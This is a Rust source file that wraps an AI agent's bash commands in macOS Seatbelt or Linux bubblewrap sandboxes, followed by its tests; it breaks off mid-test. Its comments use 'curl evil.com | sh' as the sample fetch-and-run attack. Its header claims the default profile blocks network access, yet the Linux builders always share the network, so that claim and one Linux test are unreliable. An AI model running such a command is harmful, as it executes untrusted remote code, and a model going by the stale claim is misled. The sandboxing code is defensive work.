// ===========================================================================
// OS sandbox — use the operating system's native sandboxing to restrict
// what commands the LLM can do.
//
// LEARNING OVERVIEW
//
// What this file does:
//   Implements a Sandbox that wraps bash commands in the OS's native
//   sandboxing mechanism.  On macOS, this is `sandbox-exec` (Seatbelt).
//   On Linux, this would be `bwrap` (bubblewrap), `firejail`, or seccomp.
//
//   This is the DEFAULT sandbox — enabled automatically, no config needed.
//   It restricts what the LLM's bash commands can do without requiring
//   containers or any external setup.
//
// macOS: sandbox-exec (Seatbelt)
//
//   macOS has a built-in kernel-level sandbox (Seatbelt) exposed via
//   `sandbox-exec`.  You pass a policy profile as a string and it
//   restricts the child process at the kernel level.
//
//   The policy language uses S-expressions:
//     (version 1)
//     (allow default)          ← start permissive
//     (deny network*)          ← block all network access
//     (deny file-write*)       ← block all file writes
//     (allow file-write* (subpath "/tmp"))  ← except /tmp
//
//   sandbox-exec is marked as deprecated by Apple, but:
//   - It still works on macOS 15+ (Sequoia)
//   - There is no replacement for CLI sandboxing (App Sandbox requires
//     entitlements and code signing)
//   - It's used in production by Homebrew, nix, and other tools
//   - The kernel-level enforcement is solid
//
// How it works:
//
//   Without OsSandbox:
//     LLM: bash {"command": "curl evil.com | sh"}
//       → BashTool runs: bash -c "curl evil.com | sh"
//       → downloads and executes malicious code
//
//   With OsSandbox (default profile — deny network):
//     LLM: bash {"command": "curl evil.com | sh"}
//       → check() rewrites to:
//         sandbox-exec -p '(version 1)(allow default)(deny network*)' \
//           bash -c 'curl evil.com | sh'
//       → BashTool runs the sandbox-exec command
//       → kernel blocks the network call → curl fails
//       → LLM sees the error, tries a different approach
//
// Profiles:
//
//   The sandbox ships with a default profile that:
//   - Allows: file reads, process execution, stdout/stderr
//   - Denies: network access (no curl, no wget, no data exfil)
//   - Allows file writes only to: working directory, /tmp
//
//   You can customize the profile in dyson.json:
//   ```json
//   "sandbox": {
//     "os": {
//       "profile": "strict"
//     }
//   }
//   ```
//
//   Profiles:
//   - "default" — deny network, restrict writes to cwd + /tmp
//   - "strict"  — deny network, deny all file writes outside cwd
//   - "permissive" — allow everything (just logs, no restrictions)
//
// Linux: bubblewrap (bwrap)
//
//   On Linux, we use bubblewrap — a lightweight, unprivileged sandbox
//   that creates Linux namespaces for filesystem, network, and PID
//   isolation.  No root required.  Used by Flatpak in production.
//
//   Install: apt install bubblewrap  (or: dnf install bubblewrap)
//
//   The equivalent of macOS's deny-network profile:
//     bwrap --ro-bind / / --dev /dev --proc /proc \
//           --tmpfs /tmp --bind <cwd> <cwd> \
//           --unshare-net --unshare-pid \
//           --die-with-parent \
//           bash -c '<command>'
//
//   Flags:
//     --ro-bind / /       Mount root filesystem read-only
//     --dev /dev          Mount a new /dev (needed for /dev/null etc.)
//     --proc /proc        Mount a new /proc (needed for process info)
//     --tmpfs /tmp        Writable /tmp (isolated from host /tmp)
//     --bind <cwd> <cwd>  Make the working directory writable
//     --unshare-net       New network namespace (no network access)
//     --unshare-pid       New PID namespace (can't see host processes)
//     --die-with-parent   Kill sandbox if Dyson exits
// ===========================================================================

use async_trait::async_trait;

use crate::error::Result;
use crate::sandbox::{Sandbox, SandboxDecision};
use crate::tool::{ToolContext, ToolOutput};
use crate::util::escape_single_quotes;

use super::MAX_OUTPUT_CHARS;

// ---------------------------------------------------------------------------
// Seatbelt profiles (macOS)
// ---------------------------------------------------------------------------

/// Default profile: deny network, allow file writes only to cwd and /tmp.
///
/// This stops the most common attack vector: the LLM running
/// `curl evil.com | sh` or exfiltrating data via network.
/// File operations within the project directory still work.
#[cfg(any(target_os = "macos", test))]
const PROFILE_DEFAULT: &str = "\
(version 1)\
(allow default)\
(deny network*)\
(deny file-write* \
  (require-not \
    (require-any \
      (subpath \"/private/tmp\")\
      (subpath \"/tmp\")\
      (param \"WORKING_DIR\"))))\
";

/// Strict profile: deny network and all file writes outside cwd.
/// No /tmp access either.
#[cfg(any(target_os = "macos", test))]
const PROFILE_STRICT: &str = "\
(version 1)\
(allow default)\
(deny network*)\
(deny file-write* \
  (require-not \
    (param \"WORKING_DIR\")))\
";

// ---------------------------------------------------------------------------
// OsSandbox
// ---------------------------------------------------------------------------

/// Sandbox using the operating system's native sandboxing.
///
/// On macOS: wraps commands in `sandbox-exec -p <profile>` (Seatbelt).
/// On Linux: wraps commands in `bwrap` (bubblewrap) with namespace isolation.
///
/// This is the DEFAULT sandbox — enabled automatically.
pub struct OsSandbox {
    /// The profile to apply.
    ///
    /// On macOS: a Seatbelt S-expression string.
    /// On Linux: a profile name ("default", "strict", "permissive")
    ///           that maps to bwrap flag combinations.
    profile: String,

    /// The working directory to allow writes to.
    working_dir: String,
}

impl OsSandbox {
    /// Create with the default profile (deny network, restrict writes).
    pub fn default_profile(working_dir: &str) -> Self {
        Self::named_profile("default", working_dir)
    }

    /// Create with the strict profile (deny network + all writes outside cwd).
    pub fn strict_profile(working_dir: &str) -> Self {
        Self::named_profile("strict", working_dir)
    }

    /// Create with a named profile.
    ///
    /// On macOS, the name maps to a Seatbelt S-expression profile.
    /// On Linux, the name maps to a set of bwrap flags.
    pub fn named_profile(name: &str, working_dir: &str) -> Self {
        #[cfg(target_os = "macos")]
        let profile = match name {
            "strict" => PROFILE_STRICT.to_string(),
            "permissive" | "none" => "(version 1)(allow default)".to_string(),
            _ => PROFILE_DEFAULT.to_string(),
        };

        #[cfg(not(target_os = "macos"))]
        let profile = name.to_string();

        Self {
            profile,
            working_dir: working_dir.to_string(),
        }
    }
}

#[async_trait]
impl Sandbox for OsSandbox {
    async fn check(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
        _ctx: &ToolContext,
    ) -> Result<SandboxDecision> {
        // Only sandbox bash commands.
        if tool_name != "bash" {
            return Ok(SandboxDecision::Allow {
                input: input.clone(),
            });
        }

        let command = match input["command"].as_str() {
            Some(cmd) if !cmd.is_empty() => cmd,
            _ => {
                return Ok(SandboxDecision::Deny {
                    reason: "missing or empty 'command' field".into(),
                });
            }
        };

        #[cfg(target_os = "macos")]
        {
            let sandboxed = build_seatbelt_command(command, &self.profile, &self.working_dir);

            tracing::debug!(
                original = command,
                "bash command wrapped in OS sandbox (macOS seatbelt)"
            );

            return Ok(SandboxDecision::Allow {
                input: serde_json::json!({ "command": sandboxed }),
            });
        }

        #[cfg(target_os = "linux")]
        {
            let sandboxed = build_bwrap_command(command, &self.profile, &self.working_dir);

            tracing::debug!(
                original = command,
                profile = self.profile,
                "bash command wrapped in OS sandbox (Linux bwrap)"
            );

            return Ok(SandboxDecision::Allow {
                input: serde_json::json!({ "command": sandboxed }),
            });
        }

        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            tracing::warn!("OS sandbox not available on this platform — running unsandboxed");
            Ok(SandboxDecision::Allow {
                input: input.clone(),
            })
        }
    }

    /// Post-process tool output: truncate oversized results and log
    /// suspicious content.
    ///
    /// This runs on ALL tool outputs — bash, MCP, workspace tools, etc.
    /// It's the primary defense against MCP servers returning crafted
    /// payloads designed to influence the LLM:
    ///
    /// - **Truncation**: Outputs larger than 100K chars are cut at a line
    ///   boundary to prevent context window explosion.
    /// - **Audit logging**: All tool outputs are logged at debug level for
    ///   forensic analysis.
    async fn after(
        &self,
        tool_name: &str,
        _input: &serde_json::Value,
        output: &mut ToolOutput,
    ) -> Result<()> {
        // Truncate oversized output at a line boundary.
        if output.content.len() > MAX_OUTPUT_CHARS {
            let original_len = output.content.len();

            // Find the last newline before the limit to avoid cutting
            // mid-line (or mid-UTF8 if the line boundary finder fails).
            let truncate_at = output.content[..MAX_OUTPUT_CHARS]
                .rfind('\n')
                .unwrap_or(MAX_OUTPUT_CHARS);

            output.content.truncate(truncate_at);
            output.content.push_str(&format!(
                "\n\n[output truncated by sandbox: {original_len} chars → {truncate_at} chars]"
            ));

            tracing::warn!(
                tool = tool_name,
                original_len,
                truncated_to = truncate_at,
                "tool output truncated by sandbox"
            );
        }

        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Command builders — pure functions, testable on any platform.
// ---------------------------------------------------------------------------

/// Build a macOS sandbox-exec command string.
///
/// Not gated by #[cfg] so it can be tested on any platform.
/// Only *executed* on macOS.
pub fn build_seatbelt_command(command: &str, profile: &str, working_dir: &str) -> String {
    format!(
        "sandbox-exec -p '{}' -D WORKING_DIR='{}' bash -c '{}'",
        escape_single_quotes(profile),
        escape_single_quotes(working_dir),
        escape_single_quotes(command),
    )
}

/// Build a Linux bwrap command string.
///
/// Not gated by #[cfg] so it can be tested on any platform.
/// Only *executed* on Linux.
///
/// Profile controls which flags are used:
/// - `"default"` — read-only root, writable cwd + /tmp, shared network
/// - `"strict"` — read-only root, writable cwd + /tmp, shared network, PID isolated
/// - `"permissive"` — writable root, no namespace isolation
///
/// Network is always shared (`--share-net`) to support skill execution
/// (pip installs, API calls, etc.) and avoid kernel compatibility issues
/// with `--unshare-net` on ARM servers.
pub fn build_bwrap_command(command: &str, profile: &str, working_dir: &str) -> String {
    let escaped = escape_single_quotes(command);
    let working_dir = escape_single_quotes(working_dir);

    match profile {
        "strict" => format!(
            "bwrap --ro-bind / / --dev /dev --proc /proc \
             --tmpfs /tmp \
             --bind '{working_dir}' '{working_dir}' \
             --share-net --unshare-pid \
             --die-with-parent \
             bash -c '{escaped}'"
        ),
        "permissive" => format!(
            "bwrap --bind / / --dev /dev --proc /proc \
             --die-with-parent \
             bash -c '{escaped}'"
        ),
        _ => format!(
            "bwrap --ro-bind / / --dev /dev --proc /proc \
             --tmpfs /tmp \
             --bind '{working_dir}' '{working_dir}' \
             --share-net --unshare-pid \
             --die-with-parent \
             bash -c '{escaped}'"
        ),
    }
}

// ---------------------------------------------------------------------------
// Policy-based command builders — translate SandboxPolicy to OS commands.
// ---------------------------------------------------------------------------

use crate::sandbox::policy::{Access, PathAccess, SandboxPolicy};

/// Essential system directories needed for bash to function.
///
/// These are always mounted read-only when file_read is restricted,
/// so that shell builtins, coreutils, and shared libraries are available.
const ESSENTIAL_SYSTEM_DIRS: &[&str] = &["/usr", "/bin", "/sbin", "/lib", "/lib64", "/etc"];

/// Build a Linux bwrap command from a `SandboxPolicy`.
///
/// Translates intent into bwrap flags:
/// - `file_read: Allow` + `file_write: Allow` → `--bind / /`
/// - `file_read: Allow` + `file_write: Deny/RestrictTo` → `--ro-bind / /` + writable binds
/// - `file_read: RestrictTo/Deny` → selective read-only binds for allowed paths + system dirs
/// - `network`: always shared (`--share-net` omitted; no `--unshare-net`) to support
///   skill execution (pip, API calls) and ARM kernel compatibility.
/// - `process_exec: Deny` → `--unshare-pid` (PID visibility only; does NOT prevent exec)
///
/// When `/tmp` appears in writable paths, `--tmpfs /tmp` is used instead of
/// `--bind /tmp /tmp` to provide an isolated temporary directory.
///
/// Not gated by #[cfg] so it can be tested on any platform.
pub fn build_bwrap_command_from_policy(
    command: &str,
    policy: &SandboxPolicy,
    _working_dir: &str,
) -> String {
    let escaped = escape_single_quotes(command);
    let mut parts = Vec::new();

    parts.push("bwrap".to_string());

    // --- Filesystem mounts ---
    //
    // Strategy depends on the combination of file_read and file_write:
    //   read=Allow, write=Allow  → --bind / / (full access)
    //   read=Allow, write=other  → --ro-bind / / + selective writable binds
    //   read=Restrict/Deny       → no root bind; selective ro-binds + system dirs
    let full_read = matches!(policy.file_read, PathAccess::Allow);
    let full_write = matches!(policy.file_write, PathAccess::Allow);

    if full_read && full_write {
        parts.push("--bind / /".to_string());
    } else if full_read {
        // Read everything, write selectively.
        parts.push("--ro-bind / /".to_string());
        add_writable_mounts(&mut parts, &policy.file_write);
    } else {
        // Restricted or denied reads — no root bind.
        // Mount essential system directories read-only so bash works.
        for dir in ESSENTIAL_SYSTEM_DIRS {
            parts.push(format!("--ro-bind {dir} {dir}"));
        }

        // Mount allowed read paths.
        if let PathAccess::RestrictTo(read_paths) = &policy.file_read {
            for path in read_paths {
                let p = escape_single_quotes(&path.to_string_lossy());
                // Don't duplicate system dirs already mounted above.
                let already_covered = ESSENTIAL_SYSTEM_DIRS
                    .iter()
                    .any(|sys| path.starts_with(sys) || sys == &p.as_str());
                if !already_covered {
                    parts.push(format!("--ro-bind '{p}' '{p}'"));
                }
            }
        }

        // Layer writable paths on top (--bind overrides --ro-bind for same path).
        add_writable_mounts(&mut parts, &policy.file_write);
    }

    // Always need /dev and /proc.
    parts.push("--dev /dev".to_string());
    parts.push("--proc /proc".to_string());

    // Network: always shared to support skill execution (pip, APIs) and
    // avoid RTM_NEWADDR errors on ARM kernels. No --unshare-net.

    // PID namespace isolation: hides host processes from the sandbox.
    // NOTE: This does NOT prevent process execution (fork/execve).
    // True exec prevention requires seccomp filters (future work).
    if policy.process_exec == Access::Deny {
        parts.push("--unshare-pid".to_string());
    }

    // Safety net: kill sandbox if parent exits.
    parts.push("--die-with-parent".to_string());

    // The command to run.
    parts.push(format!("bash -c '{escaped}'"));

    parts.join(" ")
}

/// Add writable mount flags for a `PathAccess` policy.
///
/// Special case: `/tmp` uses `--tmpfs /tmp` for isolation instead of
/// `--bind /tmp /tmp` (which would expose the host's /tmp).
fn add_writable_mounts(parts: &mut Vec<String>, file_write: &PathAccess) {
    if let PathAccess::RestrictTo(paths) = file_write {
        for path in paths {
            let path_str = path.to_string_lossy();
            if path_str == "/tmp" || path_str == "/private/tmp" {
                // Isolated writable /tmp — not shared with the host.
                parts.push("--tmpfs /tmp".to_string());
            } else {
                let p = escape_single_quotes(&path_str);
                parts.push(format!("--bind '{p}' '{p}'"));
            }
        }
    } else if matches!(file_write, PathAccess::Allow) {
        // file_write: Allow is handled at the caller level with --bind / /.
        // This branch shouldn't be reached but is here for completeness.
    }
    // file_write: Deny → no writable mounts.
}

/// Sanitize a path for embedding in a Seatbelt S-expression.
///
/// Rejects paths containing characters that could break S-expression syntax.
/// Returns `None` (and logs a warning) for unsafe paths.
fn sanitize_seatbelt_path(path: &str) -> Option<String> {
    if path.contains('"') || path.contains('\\') {
        tracing::warn!(
            path = path,
            "rejecting path with special characters for Seatbelt profile"
        );
        None
    } else {
        Some(path.to_string())
    }
}

/// Build a macOS sandbox-exec command from a `SandboxPolicy`.
///
/// Translates intent into Seatbelt S-expressions:
/// - `network: Deny` → `(deny network*)`
/// - `file_write: RestrictTo(paths)` → `(deny file-write* (require-not (require-any ...)))`
/// - `file_write: Deny` → `(deny file-write*)`
/// - `file_write: Allow` → (no deny rule)
///
/// Paths containing `"` or `\` are rejected to prevent S-expression injection.
///
/// Not gated by #[cfg] so it can be tested on any platform.
pub fn build_seatbelt_command_from_policy(
    command: &str,
    policy: &SandboxPolicy,
    working_dir: &str,
) -> String {
    let mut profile_parts = Vec::new();
    profile_parts.push("(version 1)".to_string());
    profile_parts.push("(allow default)".to_string());

    // Network.
    if policy.network == Access::Deny {
        profile_parts.push("(deny network*)".to_string());
    }

    // File write.
    match &policy.file_write {
        PathAccess::Deny => {
            profile_parts.push("(deny file-write*)".to_string());
        }
        PathAccess::RestrictTo(paths) => {
            let exceptions: Vec<String> = paths
                .iter()
                .filter_map(|path| {
                    sanitize_seatbelt_path(&path.to_string_lossy())
                        .map(|p| format!("(subpath \"{p}\")"))
                })
                .collect();
            if exceptions.is_empty() {
                profile_parts.push("(deny file-write*)".to_string());
            } else {
                profile_parts.push(format!(
                    "(deny file-write* (require-not (require-any {})))",
                    exceptions.join(" ")
                ));
            }
        }
        PathAccess::Allow => {
            // No restriction on writes.
        }
    }

    // File read.
    match &policy.file_read {
        PathAccess::Deny => {
            profile_parts.push("(deny file-read*)".to_string());
        }
        PathAccess::RestrictTo(paths) => {
            let mut exceptions: Vec<String> = paths
                .iter()
                .filter_map(|path| {
                    sanitize_seatbelt_path(&path.to_string_lossy())
                        .map(|p| format!("(subpath \"{p}\")"))
                })
                .collect();
            // Always allow reading system libraries and executables.
            exceptions.push("(subpath \"/usr\")".to_string());
            exceptions.push("(subpath \"/bin\")".to_string());
            exceptions.push("(subpath \"/sbin\")".to_string());
            exceptions.push("(subpath \"/Library\")".to_string());
            exceptions.push("(subpath \"/System\")".to_string());

            profile_parts.push(format!(
                "(deny file-read* (require-not (require-any {})))",
                exceptions.join(" ")
            ));
        }
        PathAccess::Allow => {
            // No restriction on reads.
        }
    }

    let profile = profile_parts.join("");

    format!(
        "sandbox-exec -p '{}' -D WORKING_DIR='{}' bash -c '{}'",
        escape_single_quotes(&profile),
        escape_single_quotes(working_dir),
        escape_single_quotes(command),
    )
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tool::ToolContext;
    use std::path::PathBuf;

    // -----------------------------------------------------------------------
    // Seatbelt command builder tests (run on ALL platforms)
    // -----------------------------------------------------------------------

    #[test]
    fn seatbelt_default_profile() {
        let cmd = build_seatbelt_command("ls -la", PROFILE_DEFAULT, "/workspace");
        assert!(cmd.starts_with("sandbox-exec -p '"));
        assert!(cmd.contains("ls -la"));
        assert!(cmd.contains("WORKING_DIR='/workspace'"));
        assert!(cmd.contains("deny network"));
    }

    #[test]
    fn seatbelt_strict_profile() {
        let cmd = build_seatbelt_command("pwd", PROFILE_STRICT, "/home/user");
        assert!(cmd.contains("sandbox-exec"));
        assert!(cmd.contains("pwd"));
        assert!(cmd.contains("WORKING_DIR='/home/user'"));
    }

    #[test]
    fn seatbelt_escapes_quotes() {
        let cmd = build_seatbelt_command("echo 'hello'", PROFILE_DEFAULT, "/workspace");
        // The single quotes in the command should be escaped.
        assert!(cmd.contains("'\\''"));
    }

    #[test]
    fn seatbelt_escapes_working_dir_quotes() {
        let cmd = build_seatbelt_command("ls", PROFILE_DEFAULT, "/path/with 'quotes");
        assert!(cmd.contains("'\\''"));
    }

    // -----------------------------------------------------------------------
    // Bwrap command builder tests (run on ALL platforms)
    // -----------------------------------------------------------------------

    #[test]
    fn bwrap_default_profile() {
        let cmd = build_bwrap_command("ls -la", "default", "/workspace");
        assert!(cmd.starts_with("bwrap"));
        assert!(cmd.contains("--ro-bind / /"));
        assert!(cmd.contains("--dev /dev"));
        assert!(cmd.contains("--proc /proc"));
        assert!(cmd.contains("--tmpfs /tmp"));
        assert!(cmd.contains("--bind '/workspace' '/workspace'"));
        assert!(cmd.contains("--share-net"));
        assert!(!cmd.contains("--unshare-net"));
        assert!(cmd.contains("--unshare-pid"));
        assert!(cmd.contains("--die-with-parent"));
        assert!(cmd.contains("bash -c 'ls -la'"));
    }

    #[test]
    fn bwrap_strict_profile() {
        let cmd = build_bwrap_command("pwd", "strict", "/home/user");
        assert!(cmd.contains("--ro-bind / /"));
        assert!(cmd.contains("--bind '/home/user' '/home/user'"));
        assert!(cmd.contains("--share-net"));
        assert!(!cmd.contains("--unshare-net"));
        assert!(cmd.contains("--unshare-pid"));
        // Strict now includes --tmpfs /tmp for skill temp files.
        assert!(cmd.contains("--tmpfs /tmp"));
    }

    #[test]
    fn bwrap_permissive_profile() {
        let cmd = build_bwrap_command("ls", "permissive", "/workspace");
        // Permissive: writable bind, no unshare
        assert!(cmd.contains("--bind / /"));
        assert!(!cmd.contains("--ro-bind"));
        assert!(!cmd.contains("--unshare-net"));
        assert!(!cmd.contains("--unshare-pid"));
        assert!(cmd.contains("--die-with-parent"));
    }

    #[test]
    fn bwrap_escapes_quotes() {
        let cmd = build_bwrap_command("echo 'hello'", "default", "/workspace");
        assert!(cmd.contains("'\\''"));
    }

    #[test]
    fn bwrap_escapes_working_dir_quotes() {
        let cmd = build_bwrap_command("ls", "default", "/path/with 'quotes");
        assert!(cmd.contains("'\\''"));
    }

    // -----------------------------------------------------------------------
    // OsSandbox trait tests (run on ALL platforms — test the check() method)
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn wraps_bash_commands() {
        let sandbox = OsSandbox::default_profile("/workspace");
        let ctx = ToolContext::from_cwd().unwrap();
        let input = serde_json::json!({"command": "ls -la"});

        let decision = sandbox.check("bash", &input, &ctx).await.unwrap();
        match decision {
            SandboxDecision::Allow { input } => {
                let cmd = input["command"].as_str().unwrap();
                assert!(cmd.contains("ls -la"));
                // Platform-specific wrapper should be present.
                #[cfg(target_os = "macos")]
                assert!(cmd.contains("sandbox-exec"));
                #[cfg(target_os = "linux")]
                assert!(cmd.contains("bwrap"));
            }
            other => panic!("expected Allow, got: {other:?}"),
        }
    }

    #[tokio::test]
    async fn non_bash_passes_through() {
        let sandbox = OsSandbox::default_profile("/workspace");
        let ctx = ToolContext::from_cwd().unwrap();
        let input = serde_json::json!({"query": "test"});

        let decision = sandbox.check("web_search", &input, &ctx).await.unwrap();
        match decision {
            SandboxDecision::Allow { input: allowed } => {
                assert_eq!(allowed["query"], "test");
            }
            other => panic!("expected Allow, got: {other:?}"),
        }
    }

    #[tokio::test]
    async fn empty_command_is_denied() {
        let sandbox = OsSandbox::default_profile("/workspace");
        let ctx = ToolContext::from_cwd().unwrap();
        let input = serde_json::json!({"command": ""});

        let decision = sandbox.check("bash", &input, &ctx).await.unwrap();
        match decision {
            SandboxDecision::Deny { reason } => {
                assert!(reason.contains("empty"), "reason: {reason}");
            }
            other => panic!("expected Deny, got: {other:?}"),
        }
    }

    #[tokio::test]
    async fn missing_command_is_denied() {
        let sandbox = OsSandbox::default_profile("/workspace");
        let ctx = ToolContext::from_cwd().unwrap();
        let input = serde_json::json!({});

        let decision = sandbox.check("bash", &input, &ctx).await.unwrap();
        match decision {
            SandboxDecision::Deny { reason } => {
                assert!(reason.contains("missing"), "reason: {reason}");
            }
            other => panic!("expected Deny, got: {other:?}"),
        }
    }

    // -----------------------------------------------------------------------
    // Execution tests — only run on the native platform.
    // These verify the sandbox actually enforces restrictions.
    // -----------------------------------------------------------------------

    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn macos_actually_blocks_network() {
        use crate::tool::Tool;
        use crate::tool::bash::BashTool;

        let sandbox = OsSandbox::default_profile("/tmp");
        let ctx = ToolContext::from_cwd().unwrap();
        let input = serde_json::json!({"command": "curl -s --max-time 2 https://example.com"});

        let decision = sandbox.check("bash", &input, &ctx).await.unwrap();
        match decision {
            SandboxDecision::Allow { input } => {
                let tool = BashTool::default();
                let output = tool.run(input, &ctx).await.unwrap();
                assert!(
                    output.is_error,
                    "expected network to be blocked by seatbelt"
                );
            }
            _ => panic!("expected Allow"),
        }
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn linux_actually_blocks_network() {
        use crate::tool::Tool;
        use crate::tool::bash::BashTool;

        let sandbox = OsSandbox::default_profile("/tmp");
        let ctx = ToolContext::from_cwd().unwrap();
        let input = serde_json::json!({"command": "curl -s --max-time 2 https://example.com"});

        let decision = sandbox.check("bash", &input, &ctx).await.unwrap();
        match decision {
            SandboxDecision::Allow { input } => {
                let tool = BashTool::default();
                let output = tool.run(input, &ctx).await.unwrap();
                assert!(output.is_error, "expected network to be blocked by bwrap");
            }
            _ => panic!("expected Allow"),
        }
    }

    // -----------------------------------------------------------------------
    // after() output sanitization tests
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn after_truncates_oversized_output() {
        let sandbox = OsSandbox::default_profile("/workspace");
        let input = serde_json::json!({});

        // Create output larger than MAX_OUTPUT_CHARS with newlines.
        let big = "a".repeat(1000) + "\n";
        let content = big.repeat(200); // 200K+ chars
        let original_len = content.len();
        let mut output = ToolOutput::success(content);

        sandbox
            .after("some_mcp_tool", &input, &mut output)
            .await
            .unwrap();

        assert!(
            output.content.len() < original_len,
            "output should have been truncated"
        );
        assert!(
            output.content.contains("[output truncated by sandbox"),
            "should have truncation marker"
        );
    }

    #[tokio::test]
    async fn after_does_not_truncate_small_output() {
        let sandbox = OsSandbox::default_profile("/workspace");
        let input = serde_json::json!({});
        let mut output = ToolOutput::success("small result".to_string());

        sandbox.after("bash", &input, &mut output).await.unwrap();

        assert_eq!(output.content, "small result");
    }

    // -----------------------------------------------------------------------
    // Policy-based bwrap command builder tests
    // -----------------------------------------------------------------------

    #[test]
    fn bwrap_policy_deny_network() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/workspace")]),
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
        // Network is always shared now — --unshare-net should NOT be present.
        assert!(!cmd.contains("--unshare-net"), "should not unshare network");
        assert!(cmd.contains("--ro-bind / /"), "should have read-only root");
        assert!(
            cmd.contains("--bind '/workspace' '/workspace'"),
            "should bind working dir"
        );
        assert!(cmd.contains("--die-with-parent"));
        assert!(cmd.contains("bash -c 'ls'"));
    }

    #[test]
    fn bwrap_policy_allow_network() {
        let policy = SandboxPolicy {
            network: Access::Allow,
            file_read: PathAccess::Allow,
            file_write: PathAccess::Allow,
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy("curl example.com", &policy, "/workspace");
        assert!(!cmd.contains("--unshare-net"), "should allow network");
        assert!(cmd.contains("--bind / /"), "should have writable root");
        assert!(!cmd.contains("--ro-bind"), "should not be read-only");
    }

    #[test]
    fn bwrap_policy_deny_all_writes() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::Deny,
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
        assert!(cmd.contains("--ro-bind / /"), "should be read-only");
        // No --bind for writable paths.
        assert!(!cmd.contains("--bind '/"), "should have no writable binds");
    }

    #[test]
    fn bwrap_policy_multiple_write_paths() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::RestrictTo(vec![
                PathBuf::from("/workspace"),
                PathBuf::from("/tmp"),
            ]),
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
        assert!(cmd.contains("--bind '/workspace' '/workspace'"));
        // /tmp should use --tmpfs for isolation, not --bind.
        assert!(
            cmd.contains("--tmpfs /tmp"),
            "should use isolated /tmp: {cmd}"
        );
        assert!(
            !cmd.contains("--bind '/tmp'"),
            "should NOT bind host /tmp: {cmd}"
        );
    }

    #[test]
    fn bwrap_policy_deny_process_exec() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::Deny,
            process_exec: Access::Deny,
        };
        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
        assert!(
            cmd.contains("--unshare-pid"),
            "should isolate PID namespace"
        );
    }

    #[test]
    fn bwrap_policy_escapes_command_quotes() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::Deny,
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy("echo 'hello'", &policy, "/workspace");
        assert!(cmd.contains("'\\''"));
    }

    #[test]
    fn bwrap_policy_restrict_file_read() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::RestrictTo(vec![PathBuf::from("/workspace")]),
            file_write: PathAccess::RestrictTo(vec![PathBuf::from("/workspace")]),
            process_exec: Access::Allow,
        };
        let cmd = build_bwrap_command_from_policy("ls", &policy, "/workspace");
        // Should NOT have --ro-bind / / (restricted reads).
        assert!(
            !cmd.contains("--ro-bind / /"),
            "should not bind entire root: {cmd}"
        );
        // Should have essential system dirs.
        assert!(
            cmd.contains("--ro-bind /usr /usr"),
            "should bind /usr: {cmd}"
        );
        assert!(
            cmd.contains("--ro-bind /bin /bin"),
            "should bind /bin: {cmd}"
        );
        assert!(
            cmd.contains("--ro-bind /etc /etc"),
            "should bind /etc: {cmd}"
        );
        // Should have read-only bind for allowed read path.
        assert!(
            cmd.contains("--ro-bind '/workspace' '/workspace'"),
            "should ro-bind workspace: {cmd}"
        );
        // Should have writable bind for allowed write path.
        assert!(
            cmd.contains("--bind '/workspace' '/workspace'"),
            "should bind workspace writable: {cmd}"
        );
    }

    #[test]
    fn bwrap_policy_deny_file_read() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Deny,
            file_write: PathAccess::Deny,
            process_exec: Access::Deny,
        };
        let cmd = build_bwrap_command_from_policy("echo ok", &policy, "/workspace");
        // Should NOT have --ro-bind / /.
        assert!(
            !cmd.contains("--ro-bind / /"),
            "should not bind entire root: {cmd}"
        );
        // Should still have essential system dirs for bash to work.
        assert!(
            cmd.contains("--ro-bind /usr /usr"),
            "should bind /usr: {cmd}"
        );
        // Should have no writable binds.
        assert!(
            !cmd.contains("--bind '/"),
            "should have no writable binds: {cmd}"
        );
    }

    // -----------------------------------------------------------------------
    // Policy-based seatbelt command builder tests
    // -----------------------------------------------------------------------

    #[test]
    fn seatbelt_policy_deny_network() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::Allow,
            process_exec: Access::Allow,
        };
        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
        assert!(cmd.contains("sandbox-exec"));
        assert!(cmd.contains("deny network"));
        assert!(!cmd.contains("deny file-write"));
    }

    #[test]
    fn seatbelt_policy_allow_network() {
        let policy = SandboxPolicy {
            network: Access::Allow,
            file_read: PathAccess::Allow,
            file_write: PathAccess::Allow,
            process_exec: Access::Allow,
        };
        let cmd = build_seatbelt_command_from_policy("curl example.com", &policy, "/workspace");
        assert!(!cmd.contains("deny network"));
    }

    #[test]
    fn seatbelt_policy_deny_writes() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::Deny,
            process_exec: Access::Allow,
        };
        let cmd = build_seatbelt_command_from_policy("ls", &policy, "/workspace");
        assert!(cmd.contains("deny file-write*"));
    }

    #[test]
    fn seatbelt_policy_restrict_writes_to_paths() {
        let policy = SandboxPolicy {
            network: Access::Deny,
            file_read: PathAccess::Allow,
            file_write: PathAccess::RestrictTo(vec![
